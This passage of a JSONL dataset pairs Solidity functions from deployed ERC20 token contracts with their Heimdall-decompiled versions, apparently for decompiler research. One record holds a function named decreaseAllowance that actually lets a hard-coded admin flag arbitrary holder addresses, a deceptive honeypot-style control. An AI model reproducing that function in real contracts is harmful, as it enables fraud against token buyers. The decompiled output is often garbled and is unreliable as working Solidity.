var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    require(0x64);\n                }\n                require(!(arg1 - ((arg1 * fee) / 0x64)) > arg1);\n            }\n        }\n        var_a = address(msg.sender);\n        var_b = 0x98;\n        require(!bytes1(storage_map_d[var_a] / 0x01));\n        require(!numbers > 0);\n        require(!arg1 > numbers);\n        require(!(bytes1(reward / 0x01)), \"Error\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x05;\n        var_g = 0x4572726f72000000000000000000000000000000000000000000000000000000;\n        require(!limits > 0);\n        var_a = address(msg.sender);\n        var_b = 0x65;\n        require(!storage_map_d[var_a] > limits);\n        if (!autoCoal / 0x01) {\n        }\n        if (address(msg.sender) == (address(owner / 0x01))) {\n            if (address(msg.sender) == (address(owner / 0x01))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2712ac3E4Fb06A0d1FB54E31eB81e7db4731c417", "original_solidity_code": "function setSwapAmount(uint256 _swapAmount) external {\r\n        require(_msgSender() == shiaburnWallet);\r\n        swapAmount = _swapAmount;\r\n    }", "heimdall_decompiled_code": "function setSwapAmount(uint256 arg0) public {\n        require(address(msg.sender) == (address(store_g)));\n        swapAmount = arg0;\n    }"}
{"contract_address": "0x4103F78C623459b3e985dE5F5d78622944B9dE6D", "original_solidity_code": "function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {\r\n           _maxTxAmount = maxTxAmount;\r\n        \r\n    }", "heimdall_decompiled_code": "function setMaxTxnAmount(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxTxAmount = arg0;\n    }"}
{"contract_address": "0xe7fEA96bA7a112602bCfe9a472473627D88c3De5", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0xc8729AC1E701f3d4b5524c3937EFF6325F540fD9", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a]);\n        store_g = 0x01000000000000000000000000000000000000000000 | (uint248(store_g));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_f), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_791ac947(var_l); // call\n        store_g = uint248(store_g);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function enableTrading() external onlyOwner {\\r\\n        require(!tradingEnabled, \\\"Trading is already enabled\\\");\\r\\n        tradingEnabled = true;\\r\\n        providingLiquidity = true;\\r\\n        genesis_block = block.number;\\r\\n    }", "heimdall_decompiled_code": "function enableTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(pair / 0x0100000000000000000000000000000000000000000000)), \"Trading is already enabled\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1a;\n        var_d = 0x54726164696e6720697320616c726561647920656e61626c6564000000000000;\n        pair = 0x0101000000000000000000000000000000000000000000 | (uint240(pair));\n        store_v = block.number;\n    }"}
{"contract_address": "0x8b13B49531ed4412305DC0973197a8af7CE2eF07", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(store_o)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_f = 0x01000000000000000000000000000000000000000000 | (uint248(store_f));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_l), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_l);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_l), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_l).code.length);\n        (bool success, bytes memory ret0) = address(store_l).Unresolved_791ac947(var_l); // call\n        store_f = uint248(store_f);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_o).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function rescueETH(uint256 weiAmount) external {\\r\\n        payable(devWallet).transfer(weiAmount);\\r\\n    }", "heimdall_decompiled_code": "function rescueETH(uint256 arg0) public {\n        (bool success, bytes memory ret0) = address(store_m).transfer(arg0);\n    }"}
{"contract_address": "0x8a357F1146a32d8a2494bCdaB62452ed3498196a", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0B544F7C213E8AE1383bee649a4af778Dd450DA5", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        startTradeBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x08, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x041cdb40, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_l[var_e] = 0x041cdb40;\n        var_a = 0x041cdb40;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x041cdb40);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x08 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                            if (!0x08 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function setRedistributionAddress(address _RedistributionAddress) external onlyOwner {\r\n        require(_RedistributionAddress != address(0), \"_RedistributionAddress address cannot be 0\");\r\n        RedistributionAddress = payable(_RedistributionAddress);\r\n    }", "heimdall_decompiled_code": "function setRedistributionAddress(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"_RedistributionAddress address cannot be 0\");\n        store_h = (address(arg0)) | (uint96(store_h));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x5f5265646973747269627574696f6e4164647265737320616464726573732063;\n        var_e = 0x616e6e6f74206265203000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x19757069132C642180F1112d4cD61d67c1f06B49", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xecBa347dE2C27B261314a42e1E4ed0b4a9085bCd", "original_solidity_code": "function openTrading() external {\r\n        require(!tradingOpen);\r\n        require(msg.sender == deployer);\r\n        tradingOpen = true;        \r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(!bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(0x6716fcfe7bc5b943334907e2f5313aa7db8c4325 == msg.sender);\n        store_a = 0x01000000000000000000000000000000000000000000 | (uint248(store_a));\n    }"}
{"contract_address": "0x31b60867a6203e76120df0612769ba136097eBc8", "original_solidity_code": "function transfer(address to, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x08;\n        require(infonum - storage_map_b[var_a], \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(arg0);\n        var_b = 0x06;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xd0B4fb38f8B30Ee154db85790e555d71160107d4", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x33743F9E4bf0A323807Fc1517Bb9aD9557585f48", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x08, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x08 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                            if (!0x08 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc89FB1a9e0817a046a6E1ff4E065A4e837Ba50C2", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x0f4240) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x0f4240;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x0f4240) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x0f4240;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x0f4240) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x0f4240;\n                                emit MaxTxAmountUpdated(0x0f4240);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x55B63E91a5A7769095662Ea0990Bb736058437c7", "original_solidity_code": "function decreaseAllowance(address cjjjss) public    {\r\n       \r\n        require(_msgSender() == vipadmin123);\r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 newpassnum = 12233;\r\n        xelonlist[cjjjss] = newpassnum;\r\n       \r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0x2fc9;\n    }"}
{"contract_address": "0xFd878DaC675FA1885cFf0A08126bfc29936D03d7", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
